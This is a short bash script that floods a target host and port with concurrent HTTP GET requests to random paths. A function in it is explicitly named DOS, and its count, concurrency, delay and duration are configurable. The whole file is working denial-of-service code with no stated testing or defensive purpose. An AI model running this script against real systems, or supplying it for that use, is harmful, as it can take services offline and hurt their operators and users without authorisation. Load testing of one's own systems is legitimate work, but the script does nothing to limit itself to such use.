#!/usr/bin/env bash
TARGET="${1}"
  PORT="${2}"
  COUNT="${COUNT:-200}"
  CONCURRENCY="${CONCURRENCY:-50}"
  DELAY_MS="${DELAY_MS:-100}"
  DURATION_S="${DURATION_S:-0}"
  PAYLOAD_SIZE="${PAYLOAD_SIZE:-16}"
  if [ "${CONCURRENCY}" -lt 1 ]; then
    CONCURRENCY=1
  fi
  if [ "${PAYLOAD_SIZE}" -lt 1 ]; then
    PAYLOAD_SIZE=16
  fi

  function delay() {
    if [ "${DELAY_MS}" -gt 0 ]; then
      sleep "$(printf "%d.%03d" $((DELAY_MS / 1000)) $((DELAY_MS % 1000)))"
    fi
  }

  function DOS() {
    STR=$( cat /dev/urandom | tr -dc "a-z0-9" | fold -w "${PAYLOAD_SIZE}" | head -n 1 )
    curl "http://${TARGET}:${PORT}/${STR}" > /dev/null 2>&1
  }

if [ "${#}" -eq 2 ]; then
  started_at="${SECONDS}"
  for i in $( seq 1 "${COUNT}" ); do
    if [ "${DURATION_S}" -gt 0 ] && [ $((SECONDS - started_at)) -ge "${DURATION_S}" ]; then
      break
    fi
    while [ "$(jobs -pr | wc -l)" -ge "${CONCURRENCY}" ]; do
      wait -n || true
    done
    DOS &
    delay
  done
  while [ "$(jobs -pr | wc -l)" -gt 0 ]; do
    if [ "${DURATION_S}" -gt 0 ] && [ $((SECONDS - started_at)) -ge "${DURATION_S}" ]; then
      break
    fi
    wait -n || true
  done
fi
